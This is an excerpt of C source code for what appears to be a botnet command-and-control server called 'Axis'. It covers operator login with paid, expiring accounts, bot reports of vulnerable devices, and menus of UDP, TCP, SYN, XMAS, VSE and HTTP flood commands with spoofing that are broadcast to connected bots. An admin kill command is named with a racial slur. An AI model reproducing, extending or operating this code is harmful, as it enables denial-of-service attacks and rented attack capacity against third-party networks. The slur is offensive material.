...
void Broadcast(char *msg, int us, char *sender, int fuck, int amt2send, int axisfd)
{
    ...
    {
        if (i == us || (!CLNTS[i].connd && (sendMGM == 0 || !MNGRS[i].connd)))
            continue;
        if (fuck == 1)
        {
            char *message[1024];
            snprintf(message, sizeof(message), "\r\n" RR "[" YY "%s Logged In" RR "]", sender);
            if (sendMGM && MNGRS[i].connd && !CLNTS[i].connd)
                send(i, message, strlen(message), MSG_NOSIGNAL);
            snprintf(fhdjkc, sizeof(fhdjkc), "\r\n" RR "%s" WW "@" RR "軸" WW ": ", MNGRS[i].nick);
            if (sendMGM && MNGRS[i].connd && !CLNTS[i].connd)
        ...
        {
            char *message[1024];
            snprintf(message, sizeof(message), "\r\n" RR "[" YY "Admin(%s) Logged In" RR "]", sender);
            if (sendMGM && MNGRS[i].connd && !CLNTS[i].connd)
                send(i, message, strlen(message), MSG_NOSIGNAL);
            snprintf(fhdjkc, sizeof(fhdjkc), "\r\n" RR "%s" WW "@" RR "軸" WW ": ", MNGRS[i].nick);
            if (sendMGM && MNGRS[i].connd && !CLNTS[i].connd)
        ...
        {
            char *message[1024];
            snprintf(message, sizeof(message), "\r\n" RR "[\x1b[0m%s Logged Out" RR "]", sender);
            if (sendMGM && MNGRS[i].connd && !CLNTS[i].connd)
                send(i, message, strlen(message), MSG_NOSIGNAL);
            snprintf(fhdjkc, sizeof(fhdjkc), "\r\n" RR "%s" WW "@" RR "軸" WW ": ", MNGRS[i].nick);
            if (sendMGM && MNGRS[i].connd && !CLNTS[i].connd)
        ...
        {
            char *message[1024];
            snprintf(message, sizeof(message), "\r\n" RR "[\x1b[0mAdmin(%s) Logged Out" RR "]", sender);
            if (sendMGM && MNGRS[i].connd && !CLNTS[i].connd)
                send(i, message, strlen(message), MSG_NOSIGNAL);
            snprintf(fhdjkc, sizeof(fhdjkc), "\r\n" RR "%s" WW "@" RR "軸" WW ": ", MNGRS[i].nick);
            if (sendMGM && MNGRS[i].connd && !CLNTS[i].connd)
        ...
        else
        {
            ...
            {
                send(i, "\n", 1, MSG_NOSIGNAL);
                send(i, "" RR "", strlen("" RR ""), MSG_NOSIGNAL);
            ...
            else if (CLNTS[i].connd && strstr(CLNTS[i].arch, mybin_type))
            {
                ...
                continue;
            snprintf(fhdjkc, sizeof(fhdjkc), "\r\n" RR "%s" WW "@" RR "軸" WW ": \x1b[0m", MNGRS[i].nick);
            if (MNGRS[i].lblock == 0 && sendMGM && MNGRS[i].connd && !CLNTS[i].connd)
                send(i, fhdjkc, strlen(fhdjkc), MSG_NOSIGNAL);
            else if (MNGRS[i].lblock == 0 && !CLNTS[i].connd)
                send(i, "\r\n", 1, MSG_NOSIGNAL);
            memset(fhdjkc, 0, sizeof(fhdjkc));
        }
    }
        ...
        for (i = 0; i < n; i++)
        {
            ...
            else if (listenFD == events[i].data.fd)
            {
                while (1)
                {
                    ...
                    {
                        if (!CLNTS[ipIndex].connd || ipIndex == infd)
                            continue;
            ...
            else
            {
                ...
                while (1)
                {
                    ...
                    while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                    {
                        ...
                        { // Basic IRC-Like Ping-Pong Challenge To See If Server Is Alive
                            if (send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1)
                            {
                                done = 1;
                                break;
                        ...
                        else if (strstr(buf, "REPORT ") == buf)
                        { // Received A Report Of A Vulnerable Device
...
void *titleWriter(void *sock)
{
    ...
    while (1)
    {
        ...
        if (send(axisfd, string, strlen(string), MSG_NOSIGNAL) == -1)
            return;
        sleep(3);
    }
}
...
void *TelWorker(void *arguments)
{
    ...
    if (!strcmp(management_ip, "127.0.0.1"))
    {
        ...
        if (send(axisfd, kkkkeee, strlen(kkkkeee), MSG_NOSIGNAL) == -1)
            goto end;
        close(axisfd);
        goto end;
    }
    ...
    char login1[5000];
    char login2[5000];
    sprintf(login1, "" WW "Welcome To " RR "%s \x1b[0m| " WW "Version " RR "%s " WW "| \r\n", cnc_n, cnc_ver);
    sprintf(login2, "" WW "Enter Credentials To Join" RR "...\r\n\r\n");
    if (send(axisfd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1)
        goto end;
wait:
    if (fdgets(buf, sizeof buf, axisfd) < 1)
        goto end;
    Trim(buf);
    if (!strcmp(buf, "login"))
    {
        if (send(axisfd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1)
            goto end;
        if (send(axisfd, login1, strlen(login1), MSG_NOSIGNAL) == -1)
            goto end;
        if (send(axisfd, login2, strlen(login2), MSG_NOSIGNAL) == -1)
            goto end;
    }
    else
    {
    ...
    // Send Username
    if (send(axisfd, "" RR "Axis ID: " WW "", 23, MSG_NOSIGNAL) == -1)
        goto end;
    if (fdgets(buf, sizeof buf, axisfd) < 1)
        goto end;
    Trim(buf);
    ...
    {
        // expired
        if (send(axisfd, "\033[2J\033[1;1H", 14, 0) == -1)
            return;
        my_exp_msg = "\x1b[31mYour " RR "Axis\x1b[31m Account Has Expired, Message an Admin to Renew Subscription.\x1b[37m\r\n";
        if (send(axisfd, my_exp_msg, strlen(my_exp_msg), 0) == -1)
            return;
        // printf(my_exp_msg);
    ...
    if (strcmp(nckstrn, ACCS[fnd].axid) == 0)
    {
        if (send(axisfd, "" WW "Password: ", 23, MSG_NOSIGNAL) == -1)
            return;
        if (fdgets(buf, sizeof buf, axisfd) < 1)
            return;
        if (send(axisfd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1)
            return;
        Trim(buf);
        if (strcmp(buf, ACCS[fnd].axp) != 0)
            goto failed;
        memset(buf, 0, 2048);
        goto noice;

    failed:
        if (send(axisfd, "\033[1A", 5, MSG_NOSIGNAL) == -1)
            return;
        char *kkkkkkk = "\x1b[31mError, Incorrect Login Credentials! Attempt Logged!\r\n";
        if (send(axisfd, kkkkkkk, strlen(kkkkkkk), MSG_NOSIGNAL) == -1)
            return;
        FILE *logFile;
        logFile = fopen("" LFD "/Failed_Logins.log", "a");
        fprintf(logFile, "Failed Login Attempt (%s)\n", management_ip);
        printf("" WW "[" RR "!!!" WW "] " RR "Failed Login Attempt " WW "(" RR "%s" WW ") " WW "[" RR "!!!" WW "]\n", management_ip);
        fclose(logFile);
        memset(buf, 0, 2048);
        sleep(10);
        close(axisfd);
    ...
    noice:
        ...
        if (!strcmp(ACCS[fnd].axt, "admin"))
        {
            ...
            printf(AXISY " " WW "[" RR "Admin(" WW "%s" RR ":" WW "%s" RR ")" WW "] \x1b[32mLogged In! " AXISY "\x1b[0m\n", MNGRS[axisfd].nick, management_ip);
        }
        else
        {
            MNGRS[axisfd].axadm = 0;
            Broadcast(buf, axisfd, MNGRS[axisfd].nick, 1, MXFDS, axisfd);
            printf(AXISY " " WW "[" RR "User(" WW "%s" RR ":" WW "%s" RR ")" WW "] \x1b[32mLogged In! " AXISY "\x1b[0m\n", MNGRS[axisfd].nick, management_ip);
        }
    ...
    sprintf(axis, "" WW "[" RR "+" WW "] Welcome " RR "%s" WW "...\r\n", MNGRS[axisfd].nick);
    if (send(axisfd, axis, strlen(axis), 0) == -1)
        goto end;
    sprintf(axis, AXISY " " WW "Account Expiry: " RR "%s \r\n", MNGRS[axisfd].axexp);
    if (send(axisfd, axis, strlen(axis), 0) == -1)
        goto end;
    if (strlen(wld_motd) > 0)
    { // Detect If MOTD Is Not NULL
        if (send(axisfd, pr_motd, strlen(pr_motd), MSG_NOSIGNAL) == -1)
            goto end;
    }
    ...
    sprintf(axis1, "\r\n            " WW "· ▪" RR "▄████████ ▀████" WW "▪   ·" RR "▐███▀ " WW "·" RR "▄█  " WW "·" RR "▄████████" WW "▪·\r\n");
    sprintf(axis2, "           " WW "·  " RR "███   " WW "·" RR "███ " WW "· " RR "███▌  " WW "·" RR "▐███ " WW "▪ " RR "███" WW "· " RR "███  " WW "· " RR "███  " WW "·\r\n");
    sprintf(axis3, "             " WW "·" RR "███" WW "·   " RR "███▌  " WW "▪" RR "███" WW "·  " RR "███    ███▌" WW "·" RR "███" WW "·   " RR "█▀" WW "·\r\n");
    sprintf(axis4, "            " WW "· " RR "███   " WW "▪" RR "███  " WW "· " RR "▀███▄███▀  " WW "· " RR "███▌ ███ " WW "·   ·  ▪\r\n");
    sprintf(axis5, "            " RR "▀███████████▌   " WW "·" RR "▄██▀██▄ " WW "·   " RR "███▌▀██████████  " WW "·\r\n");
    sprintf(axis6, "          " WW "·   " RR "███▌" WW "·  " RR "███" WW "·  " RR "▐███ " WW "· " RR "███▌  " WW "·" RR "███" WW "·  ·    ▪" RR "██" WW "·\r\n");
    sprintf(axis7, "             " WW "▪" RR "███   " WW "·" RR "███  ▄███ " WW "▪  ·" RR "███▄" WW "· " RR "███ " WW "▪ " RR "▄█" WW "· · " RR "███ " WW "·\r\n");
    sprintf(axis8, "            " WW "·" RR "▄███" WW "·   " RR "█▀ " WW "·" RR "▄███" WW "·  ·   " RR "███▄ █▀" WW "· " RR "▄████████▀" WW "·\r\n\r\n");

    if (send(axisfd, axis1, strlen(axis1), MSG_NOSIGNAL) == -1)
        return;
    if (send(axisfd, axis2, strlen(axis2), MSG_NOSIGNAL) == -1)
        return;
    if (send(axisfd, axis3, strlen(axis3), MSG_NOSIGNAL) == -1)
        return;
    if (send(axisfd, axis4, strlen(axis4), MSG_NOSIGNAL) == -1)
        return;
    if (send(axisfd, axis5, strlen(axis5), MSG_NOSIGNAL) == -1)
        return;
    if (send(axisfd, axis6, strlen(axis6), MSG_NOSIGNAL) == -1)
        return;
    if (send(axisfd, axis7, strlen(axis7), MSG_NOSIGNAL) == -1)
        return;
    if (send(axisfd, axis8, strlen(axis8), MSG_NOSIGNAL) == -1)
        return;
    sprintf(axis, "              " AXISY " " WW "Type " RR "HELP " WW "For A Commands List! " AXISY "\r\n\r\n");
    if (send(axisfd, axis, strlen(axis), 0) == -1)
        return;
    char *axisprompt[200];
    snprintf(axisprompt, sizeof(axisprompt), "" RR "%s" WW "@" RR "軸" WW ": " WW "", MNGRS[axisfd].nick);
    if (send(axisfd, axisprompt, strlen(axisprompt), MSG_NOSIGNAL) == -1)
        return;
    ...
    while (fdgets(buf, sizeof buf, axisfd) > 0)
    {
        ...
        else if (strstr(buf, "CHANGEMOTD"))
        {
            if (MNGRS[axisfd].axadm == 1)
            {
                ...
                {
                    sprintf(axis, "" RR "[" WW "MOTD" RR "]\r\n" RR "[" WW "New MOTD" RR "]" WW ": ");
                    if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                        return;
                    while (fdgets(wld_motd, sizeof(wld_motd), axisfd) < 1)
                    {
                        Trim(wld_motd);
                        if (strlen(wld_motd) < motd_least_len)
                            continue;
                        break;
                    }
                    Trim(wld_motd);
                    sprintf(pr_motd, "" WW "[" RR "MOTD" WW "]" RR ": " WW "%s\r\n", wld_motd);
                    sprintf(axis, "" RR "[" WW "MOTD Changed To" RR ": " WW "%s" RR "]\r\n", wld_motd);
                    if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                        return;
                }
            }
        ...
        else if (strstr(buf, "" TRIG " UDP") || strstr(buf, "" TRIG " STD") || strstr(buf, "" TRIG " TCP") || strstr(buf, "" TRIG " ACK") || strstr(buf, "" TRIG " SYN") || strstr(buf, "" TRIG " VSE") || strstr(buf, "" TRIG " XMAS") || strstr(buf, "" TRIG " HTTP") || strstr(buf, "" TRIG " CNC") || strstr(buf, "" TRIG " CUDP") || strstr(buf, "" TRIG " CTCP") || strstr(buf, "" TRIG " CVSE") || strstr(buf, "" TRIG " CXMAS"))
        {
            ...
            */
            ...
            {
                printf("" WW "[" YY "Invalid Syntax" WW "][" RR "%s" WW "]: " RR "%s", ACCS[fnd].axid, buf);
                Trim(input_argv[1]);
                if (strstr(buf, "" TRIG " UDP") || strstr(buf, "" TRIG " TCP") || strstr(buf, "" TRIG " ACK") || strstr(buf, "" TRIG " SYN") || strstr(buf, "" TRIG " STD") || strstr(buf, "" TRIG " XMAS") || strstr(buf, "" TRIG " VSE") || strstr(buf, "" TRIG " CNC"))
                {
                    sprintf(axis, "" WW "[" RR "Invalid Syntax" WW "]\r\n" RR "[" WW "Usage" RR "]" WW ":  " TRIG " %s IP PORT TIME\r\n", input_argv[1]);
                    if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                        return;
                }
                else if (strstr(buf, "" TRIG " CUDP"))
                {
                    sprintf(axis, "" WW "[" RR "Invalid Syntax" WW "]\r\n" RR "[" WW "Usage" RR "]" WW ":  " TRIG " CUDP [IP] [PORT] [TIME] [SPOOFS] [SIZE(0-10000)] [POLL] [SLEEP]\r\n");
                    if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                        return;
                }
                else if (strstr(buf, "" TRIG " CTCP"))
                {
                    sprintf(axis, "" WW "[" RR "Invalid Syntax" WW "]\r\n" RR "[" WW "Usage" RR "]" WW ":  " TRIG " CTCP [IP] [PORT] [TIME] [SPOOFS] [FLAGS] [SIZE[0-10000)] [POLL]\r\n");
                    if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                        return;
                }
                else if (strstr(buf, "" TRIG " CVSE") || strstr(buf, "" TRIG " CXMAS"))
                {
                    sprintf(axis, "" WW "[" RR "Invalid Syntax" WW "]\r\n" RR "[" WW "Usage" RR "]" WW ":  " TRIG " %s [IP] [PORT] [TIME] [SPOOFS] [SIZE(0-1024)] [POLL]\r\n", input_argv[1]);
                    if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                        return;
                }
                else if (strstr(buf, "" TRIG " HTTP"))
                {
                    sprintf(axis, "" WW "[" RR "Invalid Syntax" WW "]\r\n" RR "[" WW "Usage" RR "]" WW ":  " TRIG " HTTP [URL] [PORT] [TIME] [THREADS] [METHOD]\r\n");
                    if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                        return;
                }
                if (send(axisfd, axisprompt, strlen(axisprompt), MSG_NOSIGNAL) == -1)
            ...
            while (getline(&line, &n, f) != -1)
            {
                ...
                {
                    targ_black = 1;
                    printf("" WW "[" YY "BLACK ATTEMPT" WW "][" RR "%s" WW "]: " RR "%s", ACCS[fnd].axid, buf);
                    sprintf(axis, "" RR "[" WW "%s - Attack Not Sent! Host %s is Blacklisted..." RR "]\r\n", MNGRS[axisfd].nick, input_argv[2]);
                    if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                        return;
                    if (send(axisfd, axisprompt, strlen(axisprompt), MSG_NOSIGNAL) == -1)
                        return;
            ...
            {
                sprintf(axis, "" RR "[" WW "Attack Not Sent! " WW "Exceeded Your Max Flood Time..." RR "]\r\n");
                if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                    return;
            }
            else if (MNGRS[axisfd].cdsts == 1)
            {
                sprintf(axis, "" RR "[" WW "%s, Server is Cooling Down - %d Second(s) Left..." RR "]\r\n", MNGRS[axisfd].nick, MNGRS[axisfd].axcldwn - MNGRS[axisfd].cdscs);
                if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                    return;
            }
            else
            {
                printf("" WW "[" YY "!" WW "][" RR "%s" WW "]: " RR "%s", ACCS[fnd].axid, buf);
                Trim(buf);
                Broadcast(buf, axisfd, usrnms, 0, MXFDS, axisfd);
                sprintf(axis, "" WW "[" RR "Attack Sent!" WW "]\r\n");
                if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                    return;
                pthread_t cdthread;
        ...
        else if (strstr(buf, "" TRIG " NIGGA"))
        { // Kill Cmd
            if (MNGRS[axisfd].axadm == 1)
            {
                Trim(buf);
                Broadcast(buf, axisfd, usrnms, 0, MXFDS, axisfd);
                sprintf(axis, "" WW "[" RR "Attacks Killed!" WW "]\r\n");
                if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                    return;
            }
            else
        ...
        {
            sprintf(axis, "" WW "╔═════════════════════════════════════╗\x1b[0m\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            sprintf(axis, "" WW "║ METHODS \x1b[90m- " RR "Shows Attack Commands     " WW "║\x1b[0m\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            sprintf(axis, "" WW "║ TOOLS   \x1b[90m- " RR "Shows Available Tools     " WW "║\x1b[0m\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            sprintf(axis, "" WW "║ SERVER  \x1b[90m- " RR "Shows ServerSide Commands " WW "║\x1b[0m\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            sprintf(axis, "" WW "║ ADMIN   \x1b[90m- " RR "Shows Admin Commands      " WW "║\x1b[0m\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            sprintf(axis, "" WW "╚═════════════════════════════════════╝\x1b[0m\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
        ...
        else if (strstr(buf, "METHODS") || strstr(buf, "methods"))
        {
            ...
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            sprintf(axis, "" WW "║ Custom UDP  \x1b[90m- " RR "" TRIG " CUDP [IP] [PORT] [TIME] [SPOOFS] [SIZE] [POLL] [SLEEP]  " WW "║\x1b[0m\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            sprintf(axis, "" WW "║ Custom TCP  \x1b[90m- " RR "" TRIG " CTCP [IP] [PORT] [TIME] [SPOOFS] [FLAGS] [SIZE] [POLL]  " WW "║\x1b[0m\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            sprintf(axis, "" WW "║ Custom XMAS \x1b[90m- " RR "" TRIG " CXMAS [IP] [PORT] [TIME] [SPOOFS] [SIZE(0-1024)] [POLL] " WW "║\x1b[0m\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            sprintf(axis, "" WW "║ Custom VSE  \x1b[90m- " RR "" TRIG " CVSE [IP] [PORT] [TIME] [SPOOFS] [SIZE(0-1024)] [POLL]  " WW "║\x1b[0m\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            sprintf(axis, "" WW "║ RHex HTTP \x1b[90m- " RR "" TRIG " HTTP [URL] [PORT] [TIME] [THREADS] [METHOD(GET/POST/HEAD)]" WW "║\x1b[0m\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            sprintf(axis, "" WW "╚═════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
            ...
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            sprintf(axis, "" WW "║ UDP \x1b[90m- " RR "" TRIG " UDP [IP] [PORT] [TIME]  " WW "║\x1b[0m\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            sprintf(axis, "" WW "║ TCP \x1b[90m- " RR "" TRIG " TCP [IP] [PORT] [TIME]  " WW "║\x1b[0m\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            sprintf(axis, "" WW "║ SYN \x1b[90m- " RR "" TRIG " SYN [IP] [PORT] [TIME]  " WW "║\x1b[0m\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            sprintf(axis, "" WW "║ ACK \x1b[90m- " RR "" TRIG " ACK [IP] [PORT] [TIME]  " WW "║\x1b[0m\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            sprintf(axis, "" WW "║ STD \x1b[90m- " RR "" TRIG " STD [IP] [PORT] [TIME]  " WW "║\x1b[0m\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            sprintf(axis, "" WW "║ XMAS \x1b[90m-" RR "" TRIG " XMAS [IP] [PORT] [TIME] " WW "║\x1b[0m\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            sprintf(axis, "" WW "║ VSE \x1b[90m- " RR "" TRIG " VSE [IP] [PORT] [TIME]  " WW "║\x1b[0m\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            sprintf(axis, "" WW "║ CNC \x1b[90m- " RR "" TRIG " CNC [IP] [PORT] [TIME]  " WW "║\x1b[0m\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            sprintf(axis, "" WW "╚═════════════════════════════════╝\x1b[0m\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
        ...
        else if (strstr(buf, "TOOLS") || strstr(buf, "tools"))
        {
            ...
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            sprintf(axis, "" WW "║ IP Lookup \x1b[90m- " RR "IPLOOKUP [TARGET] " WW "║\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            sprintf(axis, "" WW "║ Resolver \x1b[90m- " RR "RESOLVE [TARGET]   " WW "║\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            sprintf(axis, "" WW "╚═══════════════════════════════╝\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
        ...
        else if (strstr(buf, "SERVER") || strstr(buf, "server"))
        {
            ...
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            sprintf(axis, "" WW "║ BOTS \x1b[90m- " RR "Shows Bot Count/Arch " WW "║\x1b[0m\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            sprintf(axis, "" WW "║ STATS \x1b[90m- " RR "Show Account Stats  " WW "║\x1b[0m\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            sprintf(axis, "" WW "║ ONLINE \x1b[90m- " RR "Shows Online Users " WW "║\x1b[0m\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            sprintf(axis, "" WW "║ MSG \x1b[90m- " RR "Direct Message A User " WW "║\x1b[0m\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            sprintf(axis, "" WW "║ CLS \x1b[90m- " RR "Clears Screen         " WW "║\x1b[0m\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            sprintf(axis, "" WW "╚═════════════════════════════╝\x1b[0m\r\n");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
        ...
        else if (strstr(buf, "admin") || strstr(buf, "ADMIN"))
        {
            if (MNGRS[axisfd].axadm == 1)
            {
                ...
                if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                    return;
                sprintf(axis, "" WW "║ Create A Client Account \x1b[90m- " RR "ADDUSER                " WW "║\x1b[0m\r\n");
                if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                    return;
                sprintf(axis, "" WW "║ Delete A Client Account \x1b[90m- " RR "DELUSER                " WW "║\x1b[0m\r\n");
                if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                    return;
                sprintf(axis, "" WW "║ LISTEN ON/OFF \x1b[90m- " RR "Listen To User Inputs            " WW "║\x1b[0m\r\n");
                if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                    return;
                sprintf(axis, "" WW "║ CHANGEMOTD \x1b[90m- " RR "Change Message Of The Day           " WW "║\x1b[0m\r\n");
                if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                    return;
                sprintf(axis, "" WW "║ Kick \x1b[90m- " RR "KICK USER=[USERNAME] | KICK ID=[ID#]      " WW "║\x1b[0m\r\n");
                if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                    return;
                sprintf(axis, "" WW "║ Connection Ban \x1b[90m- " RR "BAN IP=[IP]                     " WW "║\x1b[0m\r\n");
                if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                    return;
                sprintf(axis, "" WW "║ User Ban \x1b[90m- " RR "BAN USER=[USER] | BAN ID=[ID#]        " WW "║\x1b[0m\r\n");
                if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                    return;
                sprintf(axis, "" WW "║ " RR "(User/ID Ban Resolves and Bans Their IP Address) " WW "║\x1b[0m\r\n");
                if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                    return;
                sprintf(axis, "" WW "║ Unban \x1b[90m- " RR "UNBAN IP=[IP]                            " WW "║\x1b[0m\r\n");
                if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                    return;
                sprintf(axis, "" WW "║ Blacklist IPv4 \x1b[90m- " RR "BLACKLIST                       " WW "║\x1b[0m\r\n");
                if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                    return;
                sprintf(axis, "" WW "║ Un-Blacklist IPv4\x1b[90m- " RR "RMBLK                         " WW "║\x1b[0m\r\n");
                if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                    return;
                sprintf(axis, "" WW "╚══════════════════════════════════════════════════╝\x1b[0m\r\n");
                if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
            ...
            {
                sprintf(axis, "" WW "[" RR "Permission Denied!" WW "]\r\n");
                if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                    return;
            }
        }
        else if (strstr(buf, "listen on") || strstr(buf, "LISTEN ON"))
        {
            if (MNGRS[axisfd].axadm == 1)
            {
                if (MNGRS[axisfd].lblock == 1)
                {
                    ...
                    sprintf(axis, "" YY "Listening Block Opened!\x1b[37m\r\n");
                    if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                        return;
                }
                else
        ...
        else if (strstr(buf, "listen off") || strstr(buf, "LISTEN OFF"))
        {
            if (MNGRS[axisfd].axadm == 1)
            {
                if (MNGRS[axisfd].lblock == 0)
                {
                    ...
                    sprintf(axis, "" YY "Listening Block Closed!\x1b[37m\r\n");
                    if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                        return;
                }
                else
        ...
        {
            int kkkkkk;
            sprintf(axis, AXISY "" RR "--- " WW "Online Users " RR "---" AXISY "\x1b[37m\r\n");
            if (send(axisfd, axis, strlen(axis), 0) == -1)
                return;
            for (kkkkkk = 0; kkkkkk < MXFDS; kkkkkk++)
            {
                if (!MNGRS[kkkkkk].connd)
                    continue;
                if (MNGRS[axisfd].axadm == 1)
                {
                    sprintf(axis, "" WW "ID(" YY "%d" WW ") %s " RR "| " YY "%s\x1b[37m\r\n", kkkkkk, MNGRS[kkkkkk].nick, MNGRS[kkkkkk].ip);
                }
                else
                {
                    sprintf(axis, "" WW "ID(" YY "%d" WW ") %s\x1b[37m\r\n", kkkkkk, MNGRS[kkkkkk].nick);
                }
                if (send(axisfd, axis, strlen(axis), 0) == -1)
                    return;
            }
        ...
        else if (strstr(buf, "msg") || strstr(buf, "MSG"))
        {
            ...
            char pmuser[50];
            char privmsg[1024];
            sprintf(axis, "" RR "[" WW "Direct Message" RR "]\r\n" RR "[" WW "Username" RR "]" WW ": ");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            ...
            Trim(pmuser);
            sprintf(axis, "" RR "[" WW "Message" RR "]" WW ": ");
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
            ...
            for (pmfd = 0; pmfd < MXFDS; pmfd++)
            {
                if (MNGRS[pmfd].connd)
                {
                    ...
                    {
                        sprintf(axis, "" RR "[" WW "Message from " YY "%s" WW ": " YY "%s" RR "]\r\n", MNGRS[axisfd].nick, privmsg);
                        if (send(pmfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                            return;
                        sprintf(axis, "" RR "%s" WW "@" RR "軸" WW ": " WW "", MNGRS[pmfd].nick);
                        if (send(pmfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                            return;
                        sent = 1;
                        break;
            ...
            if (sent && pmuser != NULL)
            {
                sprintf(axis, "" RR "[" WW "Message Sent To " YY "%s" RR "]\r\n", pmuser);
                if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                    return;
                memset(pmuser, 0, sizeof(pmuser));
                memset(privmsg, 0, sizeof(privmsg));
        ...
        {
            sprintf(axis, AXISY "" RR "--- " WW "Account Statistics " RR "---" AXISY "\x1b[37m\r\n");
            if (send(axisfd, axis, strlen(axis), 0) == -1)
                return;
            sprintf(axis, AXISY " " WW "Account Expiry - " YY "%s\x1b[37m\r\n", MNGRS[axisfd].axexp);
            if (send(axisfd, axis, strlen(axis), 0) == -1)
                return;
            sprintf(axis, AXISY " " WW "Max Flood Time - " YY "%d\x1b[37m\r\n", MNGRS[axisfd].axsecs);
            if (send(axisfd, axis, strlen(axis), 0) == -1)
                return;
            sprintf(axis, AXISY " " WW "Cooldown - " YY "%d\x1b[37m\r\n", MNGRS[axisfd].axcldwn);
            if (send(axisfd, axis, strlen(axis), 0) == -1)
                return;
        }
        else if (strstr(buf, "bots") || strstr(buf, "BOTS"))
        {
            ...
            else
            {
                if (MNGRS[axisfd].axadm == 1)
                {
                    ...
                    if (MIPS != 0)
                    {
